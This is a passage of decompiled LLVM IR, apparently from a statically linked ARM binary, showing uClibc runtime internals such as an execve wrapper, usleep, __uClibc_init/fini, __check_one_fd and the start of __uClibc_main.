  store i32 %v1_14a6c, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_14a80 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14a84 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_14a94

dec_label_pc_14a94:                               ; preds = %dec_label_pc_14a94, %entry
  %v0_14aa8 = phi i32 [ 0, %entry ], [ %v1_14aa8, %dec_label_pc_14a94 ]
  %stack_var_-36.0 = phi i32 [ %v2_14a84, %entry ], [ %v1_14a9c, %dec_label_pc_14a94 ]
  %v1_14a98 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_14a98 = load i32, i32* %v1_14a98, align 4
  %v1_14a9c = add i32 %stack_var_-36.0, 4
  %v2_14aa0 = icmp eq i32 %v2_14a98, 0
  %v1_14aa8 = add i32 %v0_14aa8, 1
  store i32 %v1_14aa8, i32* @lr, align 4
  br i1 %v2_14aa0, label %dec_label_pc_14ab0, label %dec_label_pc_14a94

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14a94
  %v3_14ab0 = mul i32 %v1_14aa8, 4
  %v1_14ab4 = add i32 %v3_14ab0, 18
  %v1_14ab8 = and i32 %v1_14ab4, -8
  %v2_14abc = sub i32 %v2_14a80, %v1_14ab8
  %v2_14ac4 = inttoptr i32 %v2_14abc to i32*
  store i32 %arg2, i32* %v2_14ac4, align 4
  %v0_14ad0 = load i32, i32* @sp, align 4
  store i32 %v0_14ad0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14ad8, %dec_label_pc_14ab0
  %v1_14aec = phi i32 [ %v0_14ad0, %dec_label_pc_14ab0 ], [ %v5_14aec, %dec_label_pc_14ad8 ]
  %stack_var_-36.1 = phi i32 [ %v2_14a84, %dec_label_pc_14ab0 ], [ %v1_14ae4, %dec_label_pc_14ad8 ]
  %v1_14adc = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_14adc = load i32, i32* %v1_14adc, align 4
  %v0_14ae0 = load i32, i32* @lr, align 4
  %v1_14ae0 = add i32 %v0_14ae0, -1
  store i32 %v1_14ae0, i32* @lr, align 4
  %v7_14ae0 = icmp eq i32 %v0_14ae0, 1
  %v1_14ae4 = add i32 %stack_var_-36.1, 4
  %v2_14aec = add i32 %v1_14aec, 4
  %v3_14aec = inttoptr i32 %v2_14aec to i32*
  store i32 %v2_14adc, i32* %v3_14aec, align 4
  %v4_14aec = load i32, i32* %ip.global-to-local, align 4
  %v5_14aec = add i32 %v4_14aec, 4
  store i32 %v5_14aec, i32* %ip.global-to-local, align 4
  br i1 %v7_14ae0, label %dec_label_pc_14af4, label %dec_label_pc_14ad8

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14ad8
  %v0_14b00 = call i32 @__GI_execve()
  ret i32 %v0_14b00

; uselistorder directives
  uselistorder i32 %v5_14aec, { 1, 0 }
  uselistorder i32 %v0_14ae0, { 1, 0 }
  uselistorder i32 %v1_14aa8, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_14b20 = ptrtoint i32* %stack_var_-24 to i32
  %v2_14b2c = udiv i32 %arg1, 1000000
  store i32 %v2_14b2c, i32* %stack_var_-24, align 4
  %v2_14b54 = call i32 @__libc_nanosleep(i32 %v2_14b20, i32 0)
  ret i32 %v2_14b54
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14b78 = add i32 %tmp, 4
  %v4_14b78 = inttoptr i32 %v3_14b78 to i32*
  store i32 %arg3, i32* %v4_14b78, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_14b84 = icmp eq i32 %arg2, 0
  br i1 %v2_14b84, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_14b90 = add i32 %tmp, 4
  %v3_14b90 = inttoptr i32 %v2_14b90 to i32*
  %v4_14b90 = load i32, i32* %v3_14b90, align 4
  store i32 %v4_14b90, i32* %r0.global-to-local, align 4
  %v3_14b94 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_14b94, %bb ], [ undef, %entry ]
  %v2_14b9c = xor i1 %v2_14b84, true
  call void @__pseudo_cond_branch(i1 %v2_14b9c, i32 %.02)
  %v1_14ba8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14ba8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14bd0.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14bac = load i32, i32* @r4, align 4
  store i32 %v3_14bac, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bd0.dec_label_pc_14bd0_crit_edge, %dec_label_pc_14bd0.lr.ph
  %v1_14bd0 = phi i32 [ %v1_14bdc, %dec_label_pc_14bd0.dec_label_pc_14bd0_crit_edge ], [ 0, %dec_label_pc_14bd0.lr.ph ]
  %v0_14bd0 = phi i32 [ %v0_14bd0.pre, %dec_label_pc_14bd0.dec_label_pc_14bd0_crit_edge ], [ add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -8), %dec_label_pc_14bd0.lr.ph ]
  %v4_14bd0 = mul i32 %v1_14bd0, 4
  %v5_14bd0 = add i32 %v4_14bd0, %v0_14bd0
  %v6_14bd0 = inttoptr i32 %v5_14bd0 to i32*
  %v7_14bd0 = load i32, i32* %v6_14bd0, align 4
  call void @__pseudo_branch(i32 %v7_14bd0)
  %v0_14bdc = load i32, i32* %r4.global-to-local, align 4
  %v1_14bdc = add i32 %v0_14bdc, -1
  store i32 %v1_14bdc, i32* %r4.global-to-local, align 4
  %v2_14bdc = icmp eq i32 %v0_14bdc, 0
  br i1 %v2_14bdc, label %dec_label_pc_14be4, label %dec_label_pc_14bd0.dec_label_pc_14bd0_crit_edge

dec_label_pc_14bd0.dec_label_pc_14bd0_crit_edge:  ; preds = %dec_label_pc_14bd0
  %v0_14bd0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14be4:                               ; preds = %dec_label_pc_14bd0
  %v0_14be8.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14be8 = add i32 %v0_14be8.pre, 26296
  %v3_14be8 = inttoptr i32 %v2_14be8 to i32*
  %v4_14be8 = load i32, i32* %v3_14be8, align 4
  %v2_14bec = icmp eq i32 %v4_14be8, 0
  br i1 %v2_14bec, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14be4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14be4, %bb
  %v2_14bf4 = xor i1 %v2_14bec, true
  call void @__pseudo_cond_branch(i1 %v2_14bf4, i32 %v4_14be8)
  %v0_14bfc = load i32, i32* %r5.global-to-local, align 4
  %v2_14bfc = add i32 %v0_14bfc, 26300
  %v3_14bfc = inttoptr i32 %v2_14bfc to i32*
  %v4_14bfc = load i32, i32* %v3_14bfc, align 4
  %v2_14c00 = icmp eq i32 %v4_14bfc, 0
  br i1 %v2_14c00, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14c08 = xor i1 %v2_14c00, true
  call void @__pseudo_cond_branch(i1 %v2_14c08, i32 %v4_14bfc)
  %v2_14c0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c0c, i32* %r4.global-to-local, align 4
  %v1_14c10 = load i32, i32* @r0, align 4
  ret i32 %v1_14c10

; uselistorder directives
  uselistorder i32 %v1_14bdc, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_14c20(i16* %arg1) local_unnamed_addr {
dec_label_pc_14c20:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14c20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c20
  %v1_14c20 = load i32, i32* @r6, align 4
  %v2_14c20 = trunc i32 %v1_14c20 to i16
  store i16 %v2_14c20, i16* %arg1, align 2
  %v5_14c20 = load i32, i32* @r8, align 4
  %v6_14c20 = load i32, i32* %r0.global-to-local, align 4
  %v7_14c20 = sub i32 %v6_14c20, %v5_14c20
  store i32 %v7_14c20, i32* %r0.global-to-local, align 4
  %v1_14c24 = load i32, i32* @r6, align 4
  %v2_14c24 = trunc i32 %v1_14c24 to i16
  %v4_14c24 = inttoptr i32 %v7_14c20 to i16*
  store i16 %v2_14c24, i16* %v4_14c24, align 2
  %v5_14c24 = load i32, i32* @ip, align 4
  %v6_14c24 = load i32, i32* %r0.global-to-local, align 4
  %v7_14c24 = sub i32 %v6_14c24, %v5_14c24
  store i32 %v7_14c24, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c20, %bb
  %v8_14c24 = phi i32 [ %tmp, %dec_label_pc_14c20 ], [ %v7_14c24, %bb ]
  ret i32 %v8_14c24

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_14c3c = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14c44 = icmp eq i32 %v2_14c3c, -1
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r3, align 4
  br i1 %v3_14c44, label %dec_label_pc_14c50, label %dec_label_pc_14c68

dec_label_pc_14c50:                               ; preds = %entry
  %v0_14c54 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c5c = call i32 @__GI_open(i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -35044), i32 %v0_14c54)
  %v1_14c60 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c64 = icmp ne i32 %v2_14c5c, %v1_14c60
  call void @__pseudo_cond_branch(i1 %v1_14c64, i32 ptrtoint (i32* @global_var_138b8.544 to i32))
  br label %dec_label_pc_14c68

dec_label_pc_14c68:                               ; preds = %entry, %dec_label_pc_14c50
  %v1_14c70 = phi i32 [ %v2_14c3c, %entry ], [ %v2_14c5c, %dec_label_pc_14c50 ]
  ret i32 %v1_14c70

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14c68, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r4.global-to-local, align 4
  %v4_14c8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 96) to i32*), align 4
  %v1_14c90 = inttoptr i32 %v4_14c8c to i32*
  %v2_14c90 = load i32, i32* %v1_14c90, align 4
  %v2_14c94 = icmp eq i32 %v2_14c90, 0
  br i1 %v2_14c94, label %dec_label_pc_14c9c, label %dec_label_pc_14cd0

dec_label_pc_14c9c:                               ; preds = %entry
  %v4_14ca0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 56) to i32*), align 4
  %v2_14ca8 = icmp eq i32 %v4_14ca0, 0
  store i32 4096, i32* %v1_14c90, align 4
  br i1 %v2_14ca8, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14c9c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14c9c, %bb
  %v2_14cb4 = xor i1 %v2_14ca8, true
  call void @__pseudo_cond_branch(i1 %v2_14cb4, i32 %v4_14ca0)
  %v0_14cbc = load i32, i32* %r4.global-to-local, align 4
  %v2_14cbc = add i32 %v0_14cbc, -89952
  %v2_14cc4 = icmp eq i32 %v2_14cbc, 0
  br i1 %v2_14cc4, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_14ccc = xor i1 %v2_14cc4, true
  call void @__pseudo_cond_branch(i1 %v2_14ccc, i32 %v2_14cbc)
  br label %dec_label_pc_14cd0

dec_label_pc_14cd0:                               ; preds = %entry, %bb6
  %v1_14cd4 = load i32, i32* @r0, align 4
  ret i32 %v1_14cd4

; uselistorder directives
  uselistorder label %dec_label_pc_14cd0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_14cf0 = add i32 %tmp, 4
  store i32 %v1_14cf0, i32* %ip.global-to-local, align 4
  %v2_14cf4 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  %v3_14d00 = mul i32 %arg2, 4
  store i32 %v3_14d00, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_14d08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 20) to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_14d10 = ptrtoint i32* %stack_var_-120 to i32
  %v4_14d14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 28) to i32*), align 4
  store i32 %v4_14d14, i32* %r4.global-to-local, align 4
  %v2_14d1c = add i32 %v1_14cf0, %v3_14d00
  store i32 %v2_14d1c, i32* %ip.global-to-local, align 4
  %v9_14d20 = icmp eq i32 %v2_14d1c, %v2_14cf4
  store i1 %v9_14d20, i1* %cpsr_z.global-to-local, align 1
  %v2_14d24 = inttoptr i32 %v4_14d08 to i32*
  store i32 %arg7, i32* %v2_14d24, align 4
  store i32 26300, i32* %r2.global-to-local, align 4
  %v0_14d30 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_14d20, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_14d34 = load i32, i32* @r7, align 4
  %v2_14d34 = load i32, i32* %r5.global-to-local, align 4
  %v3_14d34 = add i32 %v2_14d34, %v1_14d34
  store i32 %v3_14d34, i32* %r3.global-to-local, align 4
  %v1_14d38 = load i32, i32* @r6, align 4
  %v3_14d38 = add i32 %v1_14d38, 26300
  %v4_14d38 = inttoptr i32 %v3_14d38 to i32*
  store i32 %arg6, i32* %v4_14d38, align 4
  %v0_14d3c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d3c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d3c = inttoptr i32 %v1_14d3c to i32*
  store i32 %v0_14d3c, i32* %v2_14d3c, align 4
  store i32 120, i32* @r2, align 4
  %v1_14d48 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d48 = load i32, i32* %r4.global-to-local, align 4
  %v3_14d48 = inttoptr i32 %v2_14d48 to i32*
  store i32 %v1_14d48, i32* %v3_14d48, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_14d38.c = load i32, i32* @r6, align 4
  %v3_14d38.c = add i32 %v1_14d38.c, 26300
  %v4_14d38.c = inttoptr i32 %v3_14d38.c to i32*
  store i32 %arg6, i32* %v4_14d38.c, align 4
  %v0_14d3c.c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d3c.c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d3c.c = inttoptr i32 %v1_14d3c.c to i32*
  store i32 %v0_14d3c.c, i32* %v2_14d3c.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 %v2_14d10, i32* %r0.global-to-local, align 4
  %v2_14d54 = bitcast i32* %stack_var_-120 to i8*
  %v3_14d54 = call i32 @__GI_memset(i8* %v2_14d54, i32 0)
  store i32 %v3_14d54, i32* %r0.global-to-local, align 4
  %v0_14d58 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d58 = inttoptr i32 %v0_14d58 to i32*
  %storemerge.pre = load i32, i32* %v1_14d58, align 4
  br label %dec_label_pc_14d64

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d64, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_14d64, %dec_label_pc_14d64 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14d64 = inttoptr i32 %storemerge to i32*
  %v2_14d64 = load i32, i32* %v1_14d64, align 4
  store i32 %v2_14d64, i32* %r3.global-to-local, align 4
  %v4_14d64 = add i32 %storemerge, 4
  store i32 %v4_14d64, i32* %r2.global-to-local, align 4
  %v2_14d68 = icmp eq i32 %v2_14d64, 0
  br i1 %v2_14d68, label %dec_label_pc_14d74, label %dec_label_pc_14d64

dec_label_pc_14d74:                               ; preds = %dec_label_pc_14d64
  store i32 %v4_14d64, i32* @r4, align 4
  store i32 %v2_14d10, i32* @r5, align 4
  %v1_14d9829 = inttoptr i32 %v4_14d64 to i32*
  %v2_14d9830 = load i32, i32* %v1_14d9829, align 4
  store i32 %v2_14d9830, i32* %r3.global-to-local, align 4
  %v2_14d9c32 = icmp eq i32 %v2_14d9830, 0
  store i1 %v2_14d9c32, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d9c32, label %dec_label_pc_14da4, label %dec_label_pc_14d80

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d74, %dec_label_pc_14d98
  %v5_14d84 = phi i32 [ %v2_14d98, %dec_label_pc_14d98 ], [ %v2_14d9830, %dec_label_pc_14d74 ]
  %v2_14d80 = icmp ugt i32 %v5_14d84, 13
  %v7_14d80 = icmp eq i32 %v5_14d84, 14
  store i1 %v7_14d80, i1* %cpsr_z.global-to-local, align 1
  %v2_14d84 = xor i1 %v2_14d80, true
  %v3_14d84 = or i1 %v7_14d80, %v2_14d84
  br i1 %v3_14d84, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_14d80
  %v4_14d84 = load i32, i32* @r5, align 4
  %v6_14d84 = and i32 %v5_14d84, 536870912
  %v7_14d84 = icmp ne i32 %v6_14d84, 0
  %v8_14d84 = mul i32 %v5_14d84, 8
  %v9_14d84 = add i32 %v4_14d84, %v8_14d84
  store i32 %v9_14d84, i32* %r0.global-to-local, align 4
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_14d80, %bb59
  %v1_14d90 = phi i1 [ %v2_14d80, %dec_label_pc_14d80 ], [ %v7_14d84, %bb59 ]
  %v2_14d88 = xor i1 %v1_14d90, true
  %v3_14d88 = or i1 %v7_14d80, %v2_14d88
  br i1 %v3_14d88, label %bb61, label %dec_label_pc_14d98

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_14d88, i32 ptrtoint (i32* @global_var_11ad0.553 to i32))
  %v0_14d94 = load i32, i32* @r4, align 4
  %v1_14d94 = add i32 %v0_14d94, 8
  store i32 %v1_14d94, i32* @r4, align 4
  %v1_14d98 = inttoptr i32 %v1_14d94 to i32*
  %v2_14d98 = load i32, i32* %v1_14d98, align 4
  store i32 %v2_14d98, i32* %r3.global-to-local, align 4
  %v2_14d9c = icmp eq i32 %v2_14d98, 0
  store i1 %v2_14d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d9c, label %dec_label_pc_14da4, label %dec_label_pc_14d80

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14d74
  store i32 %v2_14d10, i32* %r0.global-to-local, align 4
  %v1_14da8 = call i32 @_dl_aux_init(i32 %v2_14d10)
  store i32 %v1_14da8, i32* @r0, align 4
  %v1_14dac = call i32 @__GI___uClibc_init(i32 %v1_14da8)
  store i32 %v1_14dac, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_14db8 = load i32, i32* @r6, align 4
  %v2_14db8 = add i32 %v0_14db8, 96
  %v3_14db8 = inttoptr i32 %v2_14db8 to i32*
  %v4_14db8 = load i32, i32* %v3_14db8, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_14dc0 = icmp eq i32 %tmp54, 0
  store i1 %v2_14dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14dc0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_14da4
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_14da4, %bb62
  %v0_14dcc = phi i32 [ %tmp54, %dec_label_pc_14da4 ], [ 4096, %bb62 ]
  %v3_14dc8 = icmp eq i32 %tmp53, -1
  %v8_14dc8 = icmp eq i32 %tmp53, -1
  store i1 %v8_14dc8, i1* %cpsr_z.global-to-local, align 1
  %v2_14dcc = inttoptr i32 %v4_14db8 to i32*
  store i32 %v0_14dcc, i32* %v2_14dcc, align 4
  br i1 %v3_14dc8, label %dec_label_pc_14dd4, label %dec_label_pc_14dfc

dec_label_pc_14dd4:                               ; preds = %bb63
  %v0_14dd4 = call i32 @getuid()
  store i32 %v0_14dd4, i32* @r0, align 4
  store i32 %v0_14dd4, i32* @r4, align 4
  %v0_14ddc = call i32 @geteuid()
  store i32 %v0_14ddc, i32* @r0, align 4
  %v0_14de0 = load i32, i32* @r4, align 4
  %v9_14de0 = icmp eq i32 %v0_14de0, %v0_14ddc
  store i1 %v9_14de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14de0, label %dec_label_pc_14de8, label %dec_label_pc_14e24

dec_label_pc_14de8:                               ; preds = %dec_label_pc_14dd4
  %v1_14de8 = call i32 @getgid(i32 %v0_14ddc)
  store i32 %v1_14de8, i32* @r0, align 4
  store i32 %v1_14de8, i32* @r4, align 4
  %v0_14df0 = call i32 @getegid()
  store i32 %v0_14df0, i32* @r0, align 4
  %v0_14df4 = load i32, i32* @r4, align 4
  %v9_14df4 = icmp eq i32 %v0_14df4, %v0_14df0
  store i1 %v9_14df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14df4, label %dec_label_pc_14dfc, label %dec_label_pc_14e24

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14de8, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_14dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14dc8, label %dec_label_pc_14e48, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14dfc
  store i32 %tmp52, i32* @r3, align 4
  %v9_14e0c = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_14e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e0c, label %dec_label_pc_14e14, label %dec_label_pc_14e24

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e08
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_14e1c = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_14e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14e1c, label %dec_label_pc_14e48, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e08, %dec_label_pc_14de8, %dec_label_pc_14dd4, %dec_label_pc_14e14
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14e2c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14e38 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_14e44 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_14e44, i32* @r0, align 4
  br label %dec_label_pc_14e48

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e14, %dec_label_pc_14dfc, %dec_label_pc_14e24
  %v0_14e48 = load i32, i32* @r7, align 4
  %v1_14e48 = inttoptr i32 %v0_14e48 to i32*
  %v2_14e48 = load i32, i32* %v1_14e48, align 4
  store i32 %v2_14e48, i32* %r2.global-to-local, align 4
  store i32 1100, i32* %r3.global-to-local, align 4
  %v1_14e50 = load i32, i32* @r6, align 4
  %v3_14e50 = add i32 %v1_14e50, 1100
  %v4_14e50 = inttoptr i32 %v3_14e50 to i32*
  store i32 %v2_14e48, i32* %v4_14e50, align 4
  %v0_14e54 = load i32, i32* @r7, align 4
  %v1_14e54 = inttoptr i32 %v0_14e54 to i32*
  %v2_14e54 = load i32, i32* %v1_14e54, align 4
  store i32 %v2_14e54, i32* @r4, align 4
  %v2_14e58 = icmp eq i32 %v2_14e54, 0
  store i1 %v2_14e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e58, label %bb65, label %dec_label_pc_14e60

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e48
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_14e64 = load i32, i32* @r6, align 4
  %v2_14e64 = add i32 %v0_14e64, 116
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  %v4_14e64 = load i32, i32* %v3_14e64, align 4
  store i32 %v4_14e64, i32* %r3.global-to-local, align 4
  %v2_14e68 = inttoptr i32 %v4_14e64 to i32*
  store i32 %v2_14e54, i32* %v2_14e68, align 4
  %v0_14e70 = load i32, i32* @r7, align 4
  %v1_14e70 = inttoptr i32 %v0_14e70 to i32*
  %v2_14e70 = load i32, i32* %v1_14e70, align 4
  store i32 %v2_14e70, i32* %r0.global-to-local, align 4
  %v4_14e74 = call i32 @__GI_strrchr(i32 %v2_14e70, i32 47, i32 %v2_14e48, i32 %v4_14e64)
  store i32 %v4_14e74, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_14e7c = icmp eq i32 %v4_14e74, 0
  store i1 %v2_14e7c, i1* %cpsr_z.global-to-local, align 1
  %v0_14e80 = load i32, i32* @r6, align 4
  %v2_14e80 = add i32 %v0_14e80, 64
  %v3_14e80 = inttoptr i32 %v2_14e80 to i32*
  %v4_14e80 = load i32, i32* %v3_14e80, align 4
  store i32 %v4_14e80, i32* %r2.global-to-local, align 4
  br i1 %v2_14e7c, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_14e60
  %v2_14e8848 = inttoptr i32 %v4_14e80 to i32*
  store i32 0, i32* %v2_14e8848, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_14e60
  %v2_14e84 = add i32 %v4_14e74, 1
  store i32 %v2_14e84, i32* %r3.global-to-local, align 4
  %v2_14e88 = inttoptr i32 %v4_14e80 to i32*
  store i32 %v4_14e74, i32* %v2_14e88, align 4
  %v1_14e8c = load i32, i32* %r3.global-to-local, align 4
  %v2_14e8c = load i32, i32* %r2.global-to-local, align 4
  %v3_14e8c = inttoptr i32 %v2_14e8c to i32*
  store i32 %v1_14e8c, i32* %v3_14e8c, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_14e48
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_14ea4 = load i32, i32* @r6, align 4
  %v2_14ea4 = add i32 %v0_14ea4, -12
  store i32 %v2_14ea4, i32* %r8.global-to-local, align 4
  store i32 26296, i32* %r3.global-to-local, align 4
